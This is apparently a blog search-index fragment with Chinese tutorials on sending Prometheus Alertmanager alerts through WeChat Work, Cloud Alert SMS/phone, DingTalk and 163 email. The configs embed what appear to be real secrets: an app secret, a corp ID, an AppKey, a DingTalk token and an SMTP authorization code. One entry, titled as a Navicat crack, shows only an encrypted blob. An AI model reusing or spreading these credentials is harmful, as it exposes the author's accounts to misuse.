16b892c28-c0cf-4962-b45d-3c1f75242O3ws docker安装webhook-wechat Prometheus服务器上安装 创建存放webhook-wechat的数据目录 12mkdir /data/docker-prometheus/webhook-wechat -pcd /data/docker-prometheus/webhook-wechat 使用cat创建新文件 1234567891011121314cat &gt; docker-compose.yaml &lt;&lt;&quot;EOF&quot;version: &quot;2&quot;services: prometheus-webhook-webchat: image: linge365/webhook-wechat:latest container_name: prometheus-webhook-webchat restart: always volumes: - /etc/localtime:/etc/localtime ports: - &quot;5000:5000&quot; environment: ROBOT_TOKEN: &quot;填入之前复制的token&quot;EOF 启动 1docker-compose up -d 检查 123docker ps 或：docker logs -f prometheus-webhook-webchat 修改alertmanager配置12345678910vim alertmanager/config.yml #增加如下配置route: receiver: wechatreceivers:- name: 'wechat' webhook_configs: - url: 'http://192.168.224.11:5000' send_resolved: true 检查配置 12345#docker安装方式，检查docker exec -it alertmanager amtool check-config /etc/alertmanager/config.yml#二进制安装方式，检查/usr/local/Prometheus/alertmanager/alertmanager amtool check-config /etc/alertmanager/config.yml 重载alertmanager配置 1curl -X POST http://localhost:9093/-/reload 3、微信应用告警（和webhook告警二选一） 企业微信应用需要添加ip白名单才能正常使用 浏览器打开企业微信企业微信官网 手机下载“企业微信”，使用注册的手机登录。扫描二维码登录企业微信官网 短信验证 创建应用登录成功后，选择应用管理–创建应用 上传logo，填写应用名称，选择可见范围 获取AgentID创建应用成功后，复制AgentId,和查看Secret–会发送Secret到手机企业微信中。 1000002 设置ip白名单 设置可信域名 设置ip白名单 获取Secret手机下载“企业微信”app，并登录成功。”企业微信团队“发来一条新消息，点击查看Secret，复制Secret -rg8Xtzchefy6w94O6G_qT5gOMhDZt7MsZmHSELAOZw 获取部门id1 注：获取用户名或者创建标签都可以 点击通讯录–选择企业名–点右边–查看部门id，如下图： 获取corp_id点击“我的企业”–复制企业id.ww75c7ff0bc812538c 修改alertmanager配置123456789101112131415vim alertmanager/config.yml route: receiver: wechatreceivers:- name: 'wechat' wechat_configs: - send_resolved: true #to_user: '@all' #发送给企业微信用户的ID，@all是所有人 #to_tag: '1' #企业微信中创建的接收告警的标签 to_party: '1' #部门id agent_id: '1000002' # 企业微信中创建的应用的ID corp_id: 'ww75c7ff0bc812538c' # 企业微信中企业ID api_secret: '-rg8Xtzchefy6w94O6G_qT5gOMhDZt7MsZmHSELAOZw' # 企业微信中，应用的Secret 检查配置12345#docker安装方式，检查docker exec -it alertmanager amtool check-config /etc/alertmanager/config.yml#二进制安装方式，检查/usr/local/Prometheus/alertmanager/alertmanager amtool check-config /etc/alertmanager/config.yml 重载alertmanager配置1curl -X POST http://localhost:9093/-/reload 4、测试关闭node-exporter 12345#docker环境docker stop node-exporter#二进制安装环境systemctl stop node_exporter 查看prometheus的alerts: http://192.168.224.11:9090/alerts 查看alertmanager的alerts：http://192.168.224.11:9093/#/alerts 如果没收到消息，排查 1docker logs -f alertmanager 微信正常收到报警信息如下图： 四、使用模版(非必需，仅限微信应用告警) 看需求–不使用模版默认也行，不适用webhook方式告警。 1、创建模版文件（prometheus服务器操作）1234cd /data/docker-prometheus #创建存放模版的目录mkdir alertmanager/template 通过cat创建 1234567891011121314151617181920212223cat &gt; alertmanager/template/wechat.tmpl &lt;&lt;&quot;EOF&quot; {{ define &quot;wechat.html&quot; }}{{- if gt (len .Alerts.Firing) 0 -}}{{ range .Alerts }}@告警通知告警程序: prometheus_alert告警级别: {{ .Labels.severity }}级别告警类型: {{ .Labels.alertname }}故障主机: {{ .Labels.instance }}告警主题: {{ .Annotations.summary }}告警详情: {{ .Annotations.description }}触发时间: {{ .StartsAt.Local.Format &quot;2006-01-02 15:04:05&quot; }}{{ end }}{{ end -}}{{- if gt (len .Alerts.Resolved) 0 -}}{{ range .Alerts }}@告警恢复告警程序: prometheus_alert故障主机: {{ .Labels.instance }}故障主题: {{ .Annotations.summary }}告警详情: {{ .Annotations.description }}告警时间: {{ .StartsAt.Local.Format &quot;2006-01-02 15:04:05&quot; }}恢复时间: {{ .EndsAt.Local.Format &quot;2006-01-02 15:04:05&quot; }}{{ end }}{{ end -}}{{- end }}EOF 检查 1vim alertmanager/template/wechat.tmpl 2、修改alertmanager配置1vim alertmanager/config.yml 增加message这行 123456789101112#模版配置templates: - '/etc/alertmanager/template/*.tmpl'....receivers:- name: 'wechat' wechat_configs: - send_resolved: true #只增加这行配置 message: '{{ template &quot;wechat.html&quot; . }}' 重载配置 1curl -X POST http://localhost:9093/-/reload 检查 1http://192.168.224.11:9093/#/status 3、测试企业微信应用报警，修改前和修改后的区别","link":"/2023/05/10/Prometheus%E4%BD%BF%E7%94%A8%E4%BC%81%E4%B8%9A%E5%BE%AE%E4%BF%A1%E6%8E%A5%E6%94%B6%E5%91%8A%E8%AD%A6%E9%80%9A%E7%9F%A5/"},{"title":"Prometheus使用手机电话_短信接收告警通知","text":"一、环境介绍 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker方式安装的prometheus 二、使用睿象云手机电话和短信报警 注： 首先申明没有帮睿象云打任何广告。只是要讲电话、短信报警，看到睿象云有这个服务。 1、 睿象云（简称CA）安装步骤打开睿象云官网 点击注册 注册成功后并登陆 点击智能告警平台 创建应用在点“集成”，然后找到“prometheus” 点下面的“+” 号 填写应用名称，在点保持并获取key 复制AppKey 12ca730a1c18674a659ce82dbb98893ed1 分派策略1、点击“配置”—2、“分派策略”—3、“新建分派”–4、填写“分派策略名称”—5、选择“分派条件”—6、选择“分派人”—7、点击“保存” 如下图： 配置通知策略发生时：zabbix发生报警调用CA时触发 认领时：你收到短信后要回复认领时触发 关闭时：把收到的告警关闭时触发 如果配置通知策略有问题 点操作列 修改或者删除 2、 Cloud Alert 与 prometheus集成修改alertmanager的配置文件1ca730a1c18674a659ce82dbb98893ed1 通过webhook方式通知Cloud Alert，编辑告警的配置文件，新增以下内容。 1234567891011vim alertmanager/config.yml route: # 全局报警组，这个参数是必选的 receiver: careceivers:- name: 'ca' webhook_configs: - url: 'http://api.aiops.com/alert/api/event/prometheus/自己的appkey' send_resolved: true 检查配置12345#docker安装方式，检查docker exec -it alertmanager amtool check-config /etc/alertmanager/config.yml#二进制安装方式，检查/usr/local/Prometheus/alertmanager/alertmanager amtool check-config /etc/alertmanager/config.yml 重载alertmanager配置1curl -X POST http://localhost:9093/-/reload 6、测试关闭node-exporter 12345#docker环境docker stop node-exporter#二进制安装环境systemctl stop node_exporter 123查看prometheus的alerts: http://192.168.224.11:9090/alerts查看alertmanager的alerts：http://192.168.224.11:9093/#/alerts 如果没收到消息，排查 1docker logs -f alertmanager 手机正常收到短信和电话报警信息如下图：","link":"/2023/05/10/Prometheus%E4%BD%BF%E7%94%A8%E6%89%8B%E6%9C%BA%E7%94%B5%E8%AF%9D_%E7%9F%AD%E4%BF%A1%E6%8E%A5%E6%94%B6%E5%91%8A%E8%AD%A6%E9%80%9A%E7%9F%A5/"},{"title":"Navicat Premium 12.0.22 安装与破解","text":"嗨，请准确无误地输入密码查看哟！ 0a77f449b904d28f540276c1d2599c964b75c7a675ce56c8f10a57350ca33da0fdfe2dc5d8916922bae818d7e5ded621f85c383392cc13b763a9fb0dbd0d696c4b0c304a03f0c4f56d55fe8d4b64178867c5b3ba4a805967e5711d59eb72af6924435f11961efe541ffbd0cb63263f30878b5861cc2d6343a4972c18bb4f70bf563d41ccb4a6936955172a5ffb3635edc66dee091579e5b87205f45ad35773faa03668394dcdd68ba5078caff84e3c4cd1ed9a4554a94283d3e9b9421f4bb35a664bb3ec31b22bb1d6f47cf184aaf000404e177cc20a4de39d9caf9417dccd349a1d39e5574df0b845bb90e40fdba0665c796331208355d588e8ba3cf196b14c87811ebb80219283a6064028580ec2cf810f7a3b2bba26ac71be371927359645f34b20c555ac8612c3c6a34193b84eb2e6f2f778bdc3a2bce07f596ac64fd8439d133578cf4cfd89efbd8000089cb0f0f69659fc7c49813d0393461c897c5e39ee0b42c28802e71685569fcb69258d68412ad465472233a02f006df96a4ad017e41efe19d181afc41937317c0196ee392bb9b23b0fc53a0c75fcc080806e4f1495d2add3cf798f66dd582f30cd97748a6c8a236a998cf2ab89b24d662113f0391ff2e44d7fe3e00a0db4d2eb10dc45f37bd2dda13b9c62f0b9778ec1f7c0afe1c05bca7d13c7c61c9f4dd92858f1fd92721379ba3263c68b3112954ca3a06394913877260890d3284c0c0cf94899d1de9f190bde7f513f1290156784708bdf14d1a9eadc23054e398017cde80dca0af8b4b1dc67a412050096352632eff7d1306888d814663d950560e88a63d3bffa9145bb39caf17cf4e92ab3a285feb63629d0f9986f361ab648bf5d1bbbf7175d56087fe552f54321e231e4c3ae53cb8334b80785692e0fd0fe38807afd946e324cea4fb1b96cc4d6aab2f61849822b7e6f25b13bb4569a0beb54a13fd6697ecb82701108d4abd4c9b8aea8c03cd61c578e4c65e208483b8980cd34966c138918527891326b93977d377e223abf15079b79875b26f2f41c423d9e3b23f17d3016468ca6ac4b71a2a6ffb89cfe8119b152525de53d8523e1fb4838122e835a2f72ee12447cf27190f15e0b2d8c989b58fac938c0f92aa2aea44eea1d49031ab21b31cf0df74c536464c89fb2660db47528f4fd7fc1f672d0c1920d52b040c9a62e8edff90d1ab982a4e0fd91d888de8bac13e87a5ba0bb6af91067fb107aff48b913ff5388b66f553d18ef397f4edd127de2181810d4e7be5b1adb6353aedc10bd2ded31abfc909a8ced3c43540aacb3b42c75d0eb37db74ceb363e707bc6434503d3bffd5f24370bb27115de5ffba87653aa433de1f77cf5639c40d2ef56a910c4e60e57ce5d7866a40d783fd94c6c26b98600f58061b21dde5d5994477c33808e6abff253da50c7534e639102ff18406f36d73086b07ad84a563b149dc733b6679803a7561189fd5021e9247e200ea50b3221133ad21517485f53dc7e4ecfe33a7e9a6d2a530f1f47f9941928c61a4a01c333e4c36a628846382db0e079783762ddc788265129f068095f3440309a3537cfb4a7d5b339628f557e07a05db5ce2184f3d41e4983287ea857b9dd5f0e84513e26d6d3693ed2b175921e35fe73358d44509f18be7b3a3b0a00cdfd97f6903c08c6581a5825cf7c8831e560af4be97da5fecf83a69e572e0559e5b28e0c3868af84b446e7abc3716439fd878805878a701bdc22d2aadb86f2f5c9fce812249d98f37f545d4aa3b24c064898dcfa1fd43fe6e5e7f31dd596a5b5a001b26f5197be84ee22d9649ad1c329bf642c87004e0a2e68e5837b21c649c9144033ab47f9e5a5e0d0afd8c9abf107d5f3067aebd7be16d7950fa258f9d3ccd5e46b8ae46b8cb9f85aaf6c5be4c45d39b8a9fabf66e69da80ab1f5c9ab55987204837aad286c31a4000488f5c78c62662ab6dc3c91ae4fe197c4d864119fa7e2f250995f306bf0f22d343c21ffdd1035d02c6710f9e014c9ad5e15992f66072e2dc4ab572d9d1a5ecdd6e7c1a8774d41ecbc52c6d93fd4052f7159dc53b7c47bc1422e74695057164222eac6883b45b8f579cce914dd908ee27c804cd6694d9d87f59ea8c8d1afeca9184cb65eb205f3cd0910a1f799ba2828c00b47d89d51bba8a4087fb4fa90caab099fcec5a99fc769d8e2ba9034a5355b40e5491a7251c1d0799eaf5ebd9b8bcd0222c4aa3dfc0714b9fe8bb375c3b9e6b732a084c235046986b4ae4375d564ed7b27af17fec809912597b29054a1798bc2b4873476b708e91dd30ee9800396972edc6019cf47498e82c7fbf788a568499cda3f5161ec53a6e49a9743f16c8fe90769a94b91763648a1572e273b24ef1225b93198c61e7edbee99c64cc736136a439b3e27007493c1505728b0039351dc829341420d29f6f92b6c1adcd2bfea713b281e0ca07d04844903264d8422eef930ce203c63b40673c6a9c5d6f1a41eb0b4b4b5441f4bc7cedbd20444ac5709dbde6a513c0c376e1ffd7fe964cb35ce7a129e4ff25c004024b07fe3621624909bc774b7a06c3941e3f71373fa707b8396844344223982f972a64d8b0047b31f8da94543905b196048ce99da23009ac3a156e259ce88a123d1949220a657781585344ef04822cd085da4c764f220ac56c3f4ce49027fc47cb9e5cc917d69cedec073c2b6781db49e1b0341d4fb178235741cf4be171bad62ea03cf014acb2ab117ddbc1543e894989f5dde14da568aa0b8a1c06e11dc579cc549ddfa60718f08a79f8c5c0d2c28ab2a1fab874ee6a1356c7109e11ddf6094d58c3f32c365de82a44fe4d37234a752ccfa4bc180116f200c8cda3e1491ffb1d739b8e05359f7a18162fdbb26a425e1593ba3873047be5ce018ed93836fd74f4af29f8747c06edd8216d64ff1c1f3d898cb9a89bf7c63672cbfc81f308c57b84b7de16e08c5804ef5ba2781e0b0e5662e93e1351c1c0ba771f285842c21ad9a61fd4b0f2321e4a4c595efaf2aa8baf0a603e3b6f0dd135b5d7f0deabea3a595d68be2dd4f7c12ac4f9fff73976ab72f90c805b36863d98ead86216b3d42f2f672c26738a306ee6850e1f9e5e6338a80ec947fd5148ae289014b6f1e989b7b55b497a3f224ba6afde722cd03b1b606b226c481fe7fb3965e8ca8e85b378e6bbec5916863aacff02c3ae6685ba5b0557b7011a4449eec87a7ef33c47cc537d5cb7b250638a30f2c1a8ec3664c25f20db058e3b1d8fb2c384146db49361219b7d18418afb311d58eb7d460127f5267b74d27b863dca59ef36382644ae2fafc3b2d7baa0d706766ffa8a134a8a2c996034456cf7c8ecc8adadc3465e20c2ebc12fde1a32750625dac113f8a941e9496c155dba72a89ef52897b9c8c1b9777561cd3c94d3dddcc3505bcfc310701f8bd5650994b9535a6feab3a70a63f98b8c1a344b18aab8593a3c59e071cb824380e7bb8dea0880c44bf919923427b5addfcaa915dc343dc53f535e4433d36eb86a3c08f194f486ac31a4789139e287b00cf470ced51f3dae1543e0fc29e57e21dfc90b856a8d482dc955fafd01b6d19ee2cfe3915efa1aa1abcc80468623c354b487043e4c7292bdb841e622e23616c5b96d0db2579bf0200057893a97e3ef6fc3e6eb7ebe839e2567199e89f8cd215f323140d1a67d51acc17b1ad99ab84924afd0fa35eb38a2cab2cc783fa5d0b5f5c3dff01ff36b0b2bc490224682c3b97553e0cf57a0767c2e0dc9735bc16a5b6b376c6525354415c03d934fccd5d847e564f4ce50632d38f94c19465776e284b79b86ce5cb5c921f5128d13a242bb09e5726718679b7a317b45c13da4465a07190ebcef7d8ce91e0de66343a75921117735b47df7a83b4a81b9d227b4f0c1ba612039a8cba26be383f3f32c7c7636a52f97566d007bf9eab58916d80bd23e8535251d9895e2b376918f8240155cfd3cb6fff90f54e203d1b8f3e70c22aa4ac15fa3c99a947f6d48968d71a6cdf1017938254f18cc13611cbcd87a7efe50b2fddaff4f1e543797ccb69ac09152456d6397012f21488a4f239ddcacd8e09dba81d879c81f768c66f6c32d05c183486b0883aa31e3aa9f6d2f136e85bf3014a02553e73208d95cd90f833291f61d7c9992c234785452bf8111cb8527aa8bad144ec392c7c1e82e59d22ae09d4496fbec5bf4b183778de48442c46468a2c9b5c72a06b61ae2d3b9d1237d1f42bb987fd4dc690370329cf2241c8fb0a679017229585f988828b7b3785c2f61b1b9d2bb256e4a85028e0bc534a561152660bf1c4917775da46fc4064f59a66ba93ec0202f2f95ca486288e27339157bb63bb439de5973988b438f3d089673c74838a9f186e61fad6470dd5f65843c1c8db97571a7be5c91dcd7fe5410b443c23b96d08a5e52e34b53e506db9bca1e51b25fc2cd8df9caca7668ddacf96546bc550d176e2caf61fac7d87a5bcf6ebd6a7662d9fb1b864ec9bb8d42b0f0e72f63ee7244aba948c1adb481d5b87bcec8e0ebf4811466713046d89d8288d9bb097514aab021c42d170e535e0980a4ac2d059d7e27083a9afaf1f0fa6a5f34dbff4ae89c10e72b34792ab9d977e9b81aa1a1e9efdd6bebbcd20cb14e3febe8b986307788cb475ccbf1b234988b4218a954db0309c0ac7d6584c971274d5a9e650179c44deae096d7e1009e32e8975dceba52f36114f77e5c95cb6bf0d55b714fcb23fd54d19c6b1e4d3f9dd5584b6a269e0c21bc6a82de5821c93c5e05d3323e9cdc26bdeca0b04f6f889ba15ab3b6384d097fef83a5fa6344df7bf44e1b554d614689093814f720bc1785c2a2b72ca8c0c7255c4a319b195c5e89fb7124c6d2af7c749bdd86fa08dd98151720e3e340ffd26c8df17b872faf71f668fa979eed90b26b62d941ebc2327f0f7d83cb758425cfc7416ed64a1d6fd133c66e853e86117a73bd35f86743dc4c75b01176c1e6928fb25c82ebf3dd10e5b1953cea2f304504cfb621e92d329aa6e5389a8ad10817d97e4c7113e470517639f22fc87e5454e50b1a73bb56d7e8122ba270ead6f342ce5c5cd0cb59793f94a34541dad2b6ed5db67fab7637e5ac0b29173c65cd57e8a07c801b0d3de27fe4a50f0fc93a746a7addc37c72b828bdea9dddb8b8a79fdfdb9bfd60b968a8c470a4b0ba3df4485bb9f847b7fba25aeb4fcca91529411cf025a637430454b36923ed79f11438f8db68d732d9398c7d4ac91a02b084d27e7ac2ab0bd23727378c0436c53af19bb8c304cd3a9be1fa984b42edce5d9f5c41eee7a6e3a0f72fd4c653111cc80cbb71eebf12936a034764d75708a722c79a3efc3b7ff584d1972c37d81fee476114e134b0f693606bf3364fff9640e4fbd36258898f1da16a24dcde9bcebb15c4cf0373c2137cdd41f92446eeaaccd4ac1355e73b46a035f73a9bdf4255dcfa4f5eec4895c991e7ad8991833446ad2860afaf1b28a327d1fb5f68a8e26ad3f1f30a5eb1d0743abd34812fc260af488aec6d784a5aa0f913d3f76643209f5d8d44bbcb8ab1d69fc37e91298de3202a6860bdf34ceb117ab367a77379a45932106a50b1ac6945f831495ebbb518597f96effa74a52a466610e4d36cac27c62caab0dadb003f4922acbb2ed02908c0acd5fd607e8dd3407aeb4b16e2494ec301ac6e4f431d9684e0bf4601482a4c63f4b2adfd541ce9c1144a7eed8acb4162b08289be07c933ead09d28ca5f86c33843b174b81d056965f5daf02b80b8213101cc2963b5bee99e0ce6876628a048ddb139c278b2fa466c06738a32e4008e63f8a2e1c10035815dd29bf76c81aa97bcf830fd81ffcc70e124ae06c98db6d96016d08bca9b17cb55dbfd26ffecfabcd854e4f20bdffd5bb1dc79cf97a4008e36d0283d78bcd7614b640a932b71de1a71476882d848db2d9334c337e3ee94b853ceaaa3f2b61a2ee84f26fbecc6ce35c610beba02bf728b4daf8cd8c23a4425ce2bde39b9bd7e3c298950d867c9ff762ac9dbb8fe355c5139666cbc87611e470181c40211ada957ce9dc2f4eb5529f62394d16d6163cac4382959e45564a4384773e44379617a32c4a501b21e39cb8ea3a3a891201edb75dbf45daa55049ff4a6ac1c7db2b7de684890e4f09c1fecc5852dbc5cec16c604542556b8daebd2ca7147f383cb5221ed7f6735aaec26520de2a027e3d0d2b8b599508586a5f6880b45971dda81e0decc0f823666b6d93704d83887c66d2ee8d1eb3bb76e7c9c0db820d77d157ccdba23d8a3512f060ce77bb3e5b6cbaf0a7b869a059585b4cb2fd4ba8fb728532f62cdcfa1ea2db8d6023854a1a40c8eed393af83de2892b52b3fe2cce4c8fe769e272137f0c436b857f8e798de5ad54c8c44e3a85908ce22ea2eb8273f12b78b5458fc5f0677a29d48f45fa6e28de6c6280803518c0e4fc4b9a0459f2b9fbb4e6a5e4e84ad0adff20ae973b362a13b57434dfb595fcca4e7792fbf60857e5cc36e4a301f3e46e1054bbfae0b2a66741c3a463d2803ce8995be0fd06e13b4db8f75abe6f4ff3ed6db14df9a98716edab9f808f05ffbd54ab48c1cc8b1e21c7cab438d2eaac474765b41f3eef6b552fd9f17d8860fc5904cfb0f8d167949f4682b30a6f416e3c8ff415c11254965b2493fcf9ee3e214480cffb32ae8e3634e735a371ca00353d6595a724be8fc60c19c13c444a00ab8ba40eb72ded323b01b8f43efdc4d399dce98ef2b908ea476bcdd009471e06d0d5c01b1c602e8a4e6c17c06b15c7","link":"/2020/08/05/Navicat_Premium_12.0.22_%E5%AE%89%E8%A3%85%E4%B8%8E%E7%A0%B4%E8%A7%A3/"},{"title":"Prometheus使用企业钉钉接收告警通知","text":"一、环境介绍 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker方式安装的prometheus 二、获取钉钉的webhook地址 1、注册企业钉钉a、注册企业钉钉浏览器打开钉钉注册页面 填入手机号码，填入获取到的验证码，点注册 填入企业资料并注册 注册成功后，扫描二维码下载钉钉，如下图： b、添加机器人因为机器人添加，只能是钉钉电脑版（手机版钉钉不能添加机器人）。“测试钉钉报警“ 这个企业只有我一个人，所以我就把报警消息发到默认的 ”测试钉钉报警 全员群“ 里面。实际使用时，请创建个运维群–添加对应的人员进来。 电脑钉钉登陆成功后—-点击左下角的。。。—然后再点管理后台，如下图： 点击之前创建的企业名 点通讯录–组织架构–添加子部门 刷新后，把接收告警的员工调整到刚刚添加的部门 勾选部门 添加成功后，电脑钉钉消息窗口–会弹出一个测试告警的群–点击这个群—群设置–机器人 添加机器人 添加机器人 点自定义 机器人名字：随意 勾选ip：填入alertmanager外网ip 如果在自己电脑上测试钉钉告警，获取Alertmanager外网ip地址的方法为浏览器打开http://ip138.com 您的iP地址是：[xxx.xx.xx.xx]得到自己外网ip地址。 c、复制机器人webhook地址 复制webhook的地址，例如： 1https://oapi.dingtalk.com/robot/send?access_token=b840b125fbf67480b84244a520c8854fa6cf533a75e798afa1397ff9ea457d28 我们真实需要的是access_token=后面的，如下： 1b840b125fbf67480b84244a520c8854fa6cf533a75e798afa1397ff9ea457d28 三、使用prometheus-webhook-dingtalk实现钉钉告警github地址,获取最新的安装包 1、二进制安装（和docker安装二选一）12345678910#安装二进制安装包wget https://github.com/timonwong/prometheus-webhook-dingtalk/releases/download/v2.1.0/prometheus-webhook-dingtalk-2.1.0.linux-amd64.tar.gz#解压tar vzxf prometheus-webhook-dingtalk-2.1.0.linux-amd64.tar.gzls -l#移动并改名mv prometheus-webhook-dingtalk-2.1.0.linux-amd64 /usr/local/Prometheus/prometheus-webhook-dingtalk 创建配置文件 123456cat &gt; /usr/local/Prometheus/prometheus-webhook-dingtalk/config.yml &lt;&lt;&quot;EOF&quot;targets: webhook1: url: https://oapi.dingtalk.com/robot/send?access_token=修改为自己的TOKEN secret: SEC000000000000000000000EOF 创建一个prometheus用户： 1useradd -M -s /usr/sbin/nologin prometheus 更改prometheus-webhook-dingtalk用户的文件夹权限： 1chown prometheus:prometheus -R /usr/local/Prometheus/prometheus-webhook-dingtalk 创建 systemd 服务 123456789101112131415cat &gt; /etc/systemd/system/prometheus-webhook-dingtalk.service &lt;&lt; &quot;EOF&quot;[Unit]Description=prometheus-webhook-dingtalkDocumentation=https://github.com/timonwong/prometheus-webhook-dingtalk[Service]User=prometheusGroup=prometheusRestart=on-failureExecStart=/usr/local/Prometheus/prometheus-webhook-dingtalk/prometheus-webhook-dingtalk \\ --config.file=/usr/local/Prometheus/prometheus-webhook-dingtalk/config.yml[Install]WantedBy=multi-user.targetEOF 启动 prometheus-webhook-dingtalk 12systemctl daemon-reloadsystemctl start prometheus-webhook-dingtalk.service 加入到开机自启动 1systemctl enable prometheus-webhook-dingtalk.service 检查 1systemctl status prometheus-webhook-dingtalk.service 查看 prometheus-webhook-dingtalk的日志以进行故障排除： 1journalctl -u prometheus-webhook-dingtalk.service -f 2、docker安装（和二进制安装二选一，推荐）创建配置文件config.yml123456789101112131415#创建数据目录mkdir /data/docker-prometheus/prometheus-webhook-dingtalk/ -pcat &gt; /data/docker-prometheus/prometheus-webhook-dingtalk/config.yml &lt;&lt;&quot;EOF&quot;#templates:# - /etc/prometheus-webhook-dingtalk/templates/default.tmpltargets: webhook1: url: https://oapi.dingtalk.com/robot/send?access_token=之前复制的TOKEN secret: SEC000000000000000000000 #message: # text: '{{ template &quot;default.content&quot; . }}'EOF docker-compose.yaml文件注：我把prometheus-webhook-dingtalk安装在prometheus服务器上，如果安装在其他机器上也是可以的。 1234567891011121314151617cd /data/docker-prometheus/prometheus-webhook-dingtalk/cat &gt; docker-compose.yaml &lt;&lt; &quot;EOF&quot;version: '3.3'services: webhook: image: timonwong/prometheus-webhook-dingtalk:v2.1.0 container_name: prometheus-webhook-dingtalk restart: &quot;always&quot; ports: - 8060:8060 command: - '--config.file=/etc/prometheus-webhook-dingtalk/config.yml' volumes: - ./config.yml:/etc/prometheus-webhook-dingtalk/config.yml - /etc/localtime:/etc/localtime:roEOF 启动 1docker-compose up -d 检查 123docker ps或：docker logs -f prometheus-webhook-dingtalk 3、访问地址 应用 访问地址 备注 prometheus-webhook-dingtalk http://192.168.224.11:8060 无用户和密码 4、alertmanager配置alertmanager/config.yml增加如下配置： 12345678route: receiver: 'dingtalk'receivers:- name: 'dingtalk' webhook_configs: - url: 'http://192.168.224.11:8060/dingtalk/webhook1/send' send_resolved: true 检查配置12345#docker安装方式，检查docker exec -it alertmanager amtool check-config /etc/alertmanager/config.yml#二进制安装方式，检查/usr/local/Prometheus/alertmanager/alertmanager amtool check-config /etc/alertmanager/config.yml 重载alertmanager配置1curl -X POST http://localhost:9093/-/reload 5、配置触发器已配置，查看现有触发器 访问告警模块的web页面1http://192.168.224.11:9090/alerts INACTIVE：活跃中，即表示正常无告警产生。 PENDING：待触发，表示已经达到预设的阈值，但没达到预设的时间。 FIRING：表示达到预设的阈值并超过预设的时间触发告警 6、测试关闭node-exporter 12345#docker环境docker stop node-exporter#二进制安装环境systemctl stop node_exporter 123查看prometheus的alerts: http://192.168.224.11:9090/alerts查看alertmanager的alerts：http://192.168.224.11:9093/#/alerts 如果没收到钉钉消息，排查 1docker logs -f alertmanager 钉钉正常收到报警信息如下图： 7、碰到的问题由于配置名称错误导致不能发送报警信息给钉钉，如下图： 解决： 修改名称，使其配置正确","link":"/2023/05/10/Prometheus%E4%BD%BF%E7%94%A8%E4%BC%81%E4%B8%9A%E9%92%89%E9%92%89%E5%91%8A%E8%AD%A6%E9%80%9A%E7%9F%A5/"},{"title":"Prometheus使用邮件接收告警通知","text":"一、环境介绍 主机名 IP地址 系统 说明 localhost 192.168.224.11 Centos7.6 docker方式安装的prometheus 二、配置邮箱报警 1、获取邮箱授权码并开启smtp服务https://mail.163.com/ 登陆自己的163账号 Pop3/smtp/imap服务，点开启。弹出来扫描二维码点框。手机扫描发送短信。获取授权码 弹出来的框，复制授权码。就是用于第三方登录163邮箱的密码 AEYZEPRHLGGYOAEF 2、修改alertmanager配置修改alertmanager配置文件 123456789101112131415161718192021222324252627282930313233343536373839404142#二进制安装修改/usr/local/alertmanager/alertmanager.yml#docker安装修改cd /data/docker-prometheusvim alertmanager/alertmanager.yml#填入如下内容：global: #163服务器 smtp_smarthost: 'smtp.163.com:465' #发邮件的邮箱 smtp_from: 'yichenxiuops@163.com' #发邮件的邮箱用户名，也就是你的邮箱 smtp_auth_username: 'yichenxiuops@163.com' #发邮件的邮箱密码 smtp_auth_password: 'your-password' #tls验证配置，false为关闭 smtp_require_tls: falseroute: group_by: ['alertname'] # 当收到告警的时候，等待group_wait配置的时间10s，看是否还有告警，如果有就一起发出去 group_wait: 10s # 如果上次告警信息发送成功，此时又来了一个新的告警数据，则需要等待group_interval配置的时间才可以发送出去 group_interval: 10s # 如果上次告警信息发送成功，且问题没有解决，则等待 repeat_interval配置的时间再次发送告警数据 repeat_interval: 4h # 全局报警组，这个参数是必选的，和下面报警组名要相同 receiver: 'email'receivers:- name: 'email' #收邮件的邮箱 email_configs: - to: 'yichenxiuops@163.com' send_resolved: trueinhibit_rules: - source_match: severity: 'critical' target_match: severity: 'warning' equal: ['alertname', 'dev', 'instance'] 检查 1cat alertmanager/alertmanager.yml 重启alertmanager或者重新加载配置 12#重载curl -X POST http://localhost:9093/-/reload 检查 1http://192.168.224.11:9093/#/status 3、配置触发器查看现有触发器 1234567891011121314cat prometheus/alert.yml#增加如下内容groups:- name: Prometheus alert rules: # 对任何实例超过30秒无法联系的情况发出警报 - alert: 服务告警 expr: up == 0 for: 30s labels: severity: critical annotations: instance: &quot;{{ $labels.instance }}&quot; description: &quot;{{ $labels.job }} 服务已关闭&quot; 访问告警模块的web页面1http://192.168.224.11:9090/alerts INACTIVE：活跃中，即表示正常无告警产生。 PENDING：待触发，表示已经达到预设的阈值，但没达到预设的时间。 FIRING：表示达到预设的阈值并超过预设的时间触发告警 三、测试告警是否正常1、停止node-exporter12345#docker环境docker stop node-exporter#二进制安装环境systemctl stop node_exporter 2、prometheus查看浏览器打开prometheus web管理页面–点击Alerts, 3、检查alertmanager的alerts1http://192.168.224.11:9093/#/alerts 4、检查邮箱登陆163邮箱查看邮件 5、如果没收到邮件消息，排查1docker logs -f alertmanager 四、使用模版(非必需) 看需求–不使用模版默认也行。 1、创建模版文件1234cd /data/docker-prometheus #创建存放模版的目录mkdir alertmanager/template 通过cat创建 1234567891011121314151617181920212223cat &gt; alertmanager/template/email.tmpl &lt;&lt;&quot;EOF&quot; {{ define &quot;email.html&quot; }}{{- if gt (len .Alerts.Firing) 0 -}}{{ range .Alerts }}&lt;h2&gt;@告警通知&lt;/h2&gt;告警程序: prometheus_alert &lt;br&gt;告警级别: {{ .Labels.severity }} 级 &lt;br&gt;告警类型: {{ .Labels.alertname }} &lt;br&gt;故障主机: {{ .Labels.instance }} &lt;br&gt;告警主题: {{ .Annotations.summary }} &lt;br&gt;告警详情: {{ .Annotations.description }} &lt;br&gt;触发时间: {{ .StartsAt.Local.Format &quot;2006-01-02 15:04:05&quot; }} &lt;br&gt;{{ end }}{{ end -}}{{- if gt (len .Alerts.Resolved) 0 -}}{{ range .Alerts }}&lt;h2&gt;@告警恢复&lt;/h2&gt;告警程序: prometheus_alert &lt;br&gt;故障主机: {{ .Labels.instance }}&lt;br&gt;故障主题: {{ .Annotations.summary }}&lt;br&gt;告警详情: {{ .Annotations.description }}&lt;br&gt;告警时间: {{ .StartsAt.Local.Format &quot;2006-01-02 15:04:05&quot; }}&lt;br&gt;恢复时间: {{ .EndsAt.Local.Format &quot;2006-01-02 15:04:05&quot; }}&lt;br&gt;{{ end }}{{ end -}}{{- end }}EOF 检查 1vim alertmanager/template/email.tmpl 2、修改alertmanager配置1vim alertmanager/config.yml 增加html这行 12345678910111213#模版配置templates: - 